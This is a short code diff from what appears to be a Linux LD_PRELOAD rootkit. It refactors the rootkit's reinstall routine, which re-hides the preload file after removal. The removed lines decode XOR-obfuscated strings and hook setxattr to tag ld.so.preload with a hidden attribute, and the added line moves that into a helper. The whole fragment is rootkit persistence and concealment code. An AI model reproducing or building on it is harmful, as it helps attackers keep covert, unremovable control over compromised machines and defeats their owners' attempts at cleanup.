@@ -41,19 +41,7 @@ void reinstall(void)
         }
 
         // the preload file was removed somehow, now we need to hide it again
-        char xattr_user[256];
-        char *hidden_xattr_1_str = strdup(HIDDEN_XATTR_1_STR);
-        char *hidden_xattr_2_str = strdup(HIDDEN_XATTR_2_STR);
-        char *xattr = strdup(XATTR);
-
-        xor(hidden_xattr_1_str); xor(xattr);
-        snprintf(xattr_user, sizeof(xattr_user), xattr, hidden_xattr_1_str);
-        CLEAN(xattr); CLEAN(hidden_xattr_1_str);
-
-        xor(hidden_xattr_2_str);
-        HOOK(old_setxattr, CSETXATTR);
-        old_setxattr(ld_preload, xattr_user, hidden_xattr_2_str, strlen(hidden_xattr_2_str), XATTR_CREATE); // no need to check for a return value
-        CLEAN(hidden_xattr_2_str);
+        modify_xattr(ld_preload, 1); // we good.
     }
     CLEAN(lib_location);
     CLEAN(ld_preload);
